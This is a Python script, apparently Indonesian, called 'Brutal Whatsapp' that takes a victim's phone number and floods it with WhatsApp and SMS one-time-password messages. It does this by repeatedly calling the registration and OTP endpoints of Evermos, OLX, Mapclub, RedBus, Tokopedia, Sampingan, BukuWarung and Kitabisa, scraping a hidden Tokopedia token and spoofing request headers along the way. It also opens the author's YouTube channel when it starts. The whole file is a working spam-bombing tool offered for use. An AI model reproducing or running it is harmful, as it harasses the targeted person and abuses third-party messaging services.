import os,sys,time,requests,json,re
from colorama import Fore,Back,init

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text
localtime=time.asctime(time.localtime(time.time()))

Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"


def load():
	load = '█'
	count = 0

	for t in range(21):
	    time.sleep(1)
	    print(f'\r{R} > {Y}Meluncurkan Roket {R}({biru}{t}{R}){Y} {G}✓ ', end='', flush=True)
	    count += 1
	    if count == 1:
	    	count = 0
	    	load += '█'
def logo():
	os.system("clear")
	print(f"{biru}Subscribe Channel {W}Aing Dulu Gan{biru}!{G} ✓{W}")
	os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
	time.sleep(10)
	os.system("clear")
	print (f"""{ungu}	|
{ungu}       ( )
{ungu}      / _ \    {biru}╔╗ {W}┬─┐┬ ┬┌┬┐┌─┐┬   {G}╦ ╦{W}╔═╗
{ungu}     |.o '.|   {biru}╠╩╗{W}├┬┘│ │ │ ├─┤│{R}───{G}║║║{W}╠═╣
{ungu}     |'._.'|   {biru}╚═╝{W}┴└─└─┘ ┴ ┴ ┴┴─┘ {G}╚╩╝{W}╩ ╩
{ungu}     | {Y}1{W}.{Y}3{ungu} |{W}   [{Y}•{W}] Info sc{R} :{G} B{W}rutal {G}W{W}hatsapp
{ungu}   .'|  |  |`. {W}[{Y}•{W}] Info Creator{R} :{W} Ammar Executed
{ungu}  (  |  |  |  )
{ungu}  |,-'--|--'-.|{R}   ({W} Version Script : 1.3{R} )
{abu} ------------------------------------------------------
	 {W}[{Y}•{W}] Note{R}:{W} Max 5 Brutal Spam
	 {W}[{Y}•{W}] Ip Kamu{R}:{Y} {ip}
	 {W}[{Y}•{W}] Waktu/Jam{R}:{Y} {localtime}

""")

def wa():
	heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ammarganz=json.dumps({"phone":"62"+nomor})
	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
	AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "wa","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
	AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
	AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
	wkwk=json.dumps({"account":nomor})
	req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
	kepala={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
	gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers=kepala).text
	headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}
	site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
	search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
	datap = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}
	sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = datap)
	Xen=requests.get("https://m.redbus.id/api/getOtp?number=0"+nomor+"&cc=62&whatsAppOpted=true",headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}).text
	req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
	ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
	data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
	req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
	Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text	

try:
	os.system("clear")
	logo()
	print(f"{W}[{R}!{W}] Example{R}:{Y} 8xx")
	nomor=input(f"{W}[{R}?{W}] Nomor{R}:{G} ")
	jum=input(f"{W}[{R}?{W}] Jumlah {R}({biru}max:5{R}){R}:{G} ")
	
	if jum == "1":
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
	if jum == "2":
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
	if jum == "3":
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
	if jum == "4":
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
	if jum == "5":
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
		load()
		print()
		wa()
		wa()
		print (f"{W}Berhasil Mengirim Brutal Wa {G}✓")
	if nomor == "" or nomor == " ":
		exit(f"{W}Masukin Yang Bener Kaka {R}! ! !{W}")
	if jum == "" or jum == " ":
		exit(f"{W}Masukin Yang Bener Kaka {R}! ! !{W}")
	if jum > "5":
		exit (f"{W}[{R}!{W}] Maaf Max {biru}5{W} Spam {R}! ! !")
except ValueError:
	exit(f"{W}Masukin Yang Bener Kaka {R}! ! !{W}")
except KeyboardInterrupt:
	exit(f"{W}Exited With Code {R}:{W}1 {R}! ! ! {W}")
